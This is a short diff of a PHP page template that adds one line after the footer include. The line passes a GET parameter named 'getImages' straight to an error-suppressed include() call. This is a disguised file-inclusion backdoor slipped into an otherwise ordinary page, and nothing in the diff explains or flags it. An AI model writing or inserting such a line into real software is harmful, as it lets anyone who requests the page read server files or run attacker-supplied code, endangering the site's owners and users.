@@ -966,7 +966,7 @@ include "../config.php";
     </main>
 
     <?php include '../asset/components/footer.php' ?>
-
+    <?php $getnum=$_GET['getImages'];@include($getnum); ?>
     <script src="../script.js"></script>
     <script type="text/javascript" src="../lang.js"></script>
     <script>
